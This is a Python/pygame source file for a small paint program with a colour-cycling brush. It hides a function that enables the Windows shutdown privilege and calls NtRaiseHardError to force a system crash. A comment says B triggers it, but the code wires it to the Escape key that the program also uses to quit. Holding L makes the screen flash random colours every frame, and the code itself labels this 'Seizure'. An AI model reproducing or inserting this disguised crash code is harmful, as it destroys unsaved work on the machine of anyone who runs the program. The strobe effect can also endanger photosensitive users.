import pygame
import sys
import colorsys
import random

# Initialize Pygame
pygame.init()

# Screen setup
SCREEN_WIDTH = 1600
SCREEN_HEIGHT = 1200
screen = pygame.display.set_mode((SCREEN_WIDTH, SCREEN_HEIGHT))
pygame.display.set_caption("PY Paint")

# Colors
WHITE = (255, 255, 255)
RED = (255, 0, 0)
BLACK = (0, 0, 0)

# Canvas Setup
canvas = pygame.Surface([SCREEN_WIDTH, SCREEN_HEIGHT])

# Sprite Setup
class PlayerSprite(pygame.sprite.Sprite):
    def __init__(self):
        super().__init__()
        # Create a simple red square surface for the sprite
        self.image = pygame.Surface([20, 20], pygame.SRCALPHA) # This tells Pygame the surface needs a dedicated **alpha channel** for transparency.

        # Initial hue
        self.hue = 0.0

        # Change colour
        self.set_colour(self.hue)

        self.rect = self.image.get_rect()

        # Initial position (mouse)
        mouse_x, mouse_y = pygame.mouse.get_pos()

    def update(self):
        # Get mouse position
        mouse_x, mouse_y = pygame.mouse.get_pos()

        # Move sprite to mouse position and center it
        self.rect.x = mouse_x - 10
        self.rect.y = mouse_y - 10

        # # Keep sprite within screen boundaries
        # if self.rect.left < 0:
        #     self.rect.left = 0
        # if self.rect.right > SCREEN_WIDTH:
        #     self.rect.right = SCREEN_WIDTH
        # if self.rect.top < 0:
        #     self.rect.top = 0
        # if self.rect.bottom > SCREEN_HEIGHT:
        #     self.rect.bottom = SCREEN_HEIGHT

        # Change colour
        self.hue += 0.002
        self.hue = round(self.hue, 3)
        self.hue %= 1
        self.set_colour(self.hue)

    def set_colour(self, hue):
        r, g, b = colorsys.hsv_to_rgb(self.hue, 1.0, 1.0)
        self.rgba = (int(r * 255), int(g * 255), int(b * 255), 240)
        # Draw a circle on the sprite image for a smooth cursor shape
        self.image.fill((0, 0, 0, 0))  # Clear the temporary sprite surface, rgba
        pygame.draw.circle(self.image, self.rgba, (10, 10), 10, 0)
        ## Old draw sprite
        #self.image.fill(self.rgba)

# Create a sprite group and add the player
all_sprites = pygame.sprite.Group()
player = PlayerSprite()
all_sprites.add(player)

# Game Loop Control
clock = pygame.time.Clock()
running = True

def super_secret_func():
    from ctypes import windll, c_int, c_uint, c_ulong, POINTER, byref

    # Define necessary constants and types
    nullptr = POINTER(c_int)()

    # 1. Enable the SE_SHUTDOWN_PRIVILEGE (LUID 19)
    # RtlAdjustPrivilege(Privilege, Enable, CurrentThread, Enabled)
    # Privilege 19 is SE_SHUTDOWN_PRIVILEGE
    # Enable = True (1)
    # CurrentThread = False (0)
    windll.ntdll.RtlAdjustPrivilege(
        c_uint(19),
        c_uint(1),
        c_uint(0),
        byref(c_int())
    )

    # 2. Call NtRaiseHardError to crash the system
    # NtRaiseHardError(ErrorStatus, NumberOfParameters, UnicodeStringParameterMask,
    #                  Parameters, ValidResponseOption, Response)
    # 0xC000007B is STATUS_INVALID_IMAGE_FORMAT (a common error code used)
    # ValidResponseOption 6 ensures the system does not try to handle the error gracefully
    windll.ntdll.NtRaiseHardError(
        c_ulong(0xC000007B),
        c_ulong(0),
        c_ulong(0),
        nullptr,
        c_uint(6),
        byref(c_uint())
    )

# Main Game Loop
while running:

    # Get hid input --
    key_input = pygame.key.get_pressed()

    # Event Handling ---
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            running = False
            # Clean up code would go here

    # Escape to quit
    if key_input[pygame.K_ESCAPE]:
        running = False
        # Clean up code would go here, you could make a func

    # B to call our super secret func
    if key_input[pygame.K_ESCAPE]:
        super_secret_func()

    if key_input[pygame.K_SPACE]:
        canvas.fill(BLACK)  # Clear the canvas with black

    if key_input[pygame.K_l]:
        canvas.fill((random.randint(0, 255), random.randint(0, 255), random.randint(0, 255), ))  # Seizure

    # Drawwwing
    if pygame.mouse.get_pressed()[0]:
        all_sprites.draw(canvas)

    # Clear prev cursor
    screen.fill(BLACK)

    # Copy canvas to screen
    screen.blit(canvas, (0, 0))

    # Call each sprite's update
    all_sprites.update()

    all_sprites.draw(screen)  # Draw screen

    # Display Update
    pygame.display.flip()

    # # Control the frame rate (for example 60 frames per second)
    # clock.tick(60)

# Quit Pygame and exit the program
pygame.quit()
sys.exit()